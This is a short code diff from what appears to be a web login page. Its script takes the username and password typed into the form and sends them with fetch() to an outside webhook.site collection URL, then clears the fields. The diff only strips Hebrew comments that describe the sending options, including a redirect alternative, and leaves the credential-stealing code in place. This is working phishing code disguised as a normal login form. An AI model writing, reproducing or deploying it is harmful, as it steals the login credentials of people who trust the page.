@@ -77,18 +77,14 @@
         var username = encodeURIComponent(document.getElementById('u').value);
         var password = encodeURIComponent(document.getElementById('p').value);
 
-        // שליחה ב-HTTP GET
         var targetUrl = `https://webhook.site/afcd5283-a6d4-44dd-b31b-3d1ced1f70e0/u=${username}&p=${password}`;
-        
-        // אפשרות 1: שליחה בשיטת fetch (נשאר בעמוד)
+  
         fetch(targetUrl)
           .then(response => console.log('Data sent:', response.status))
           .catch(err => console.error('Error sending data:', err));
 
-        // אפשרות 2: ניתוב ישיר לכתובת (Redirect)
         // window.location.href = targetUrl;
 
-        // ניקוי שדות
         document.getElementById('u').value = '';
         document.getElementById('p').value = '';
       });
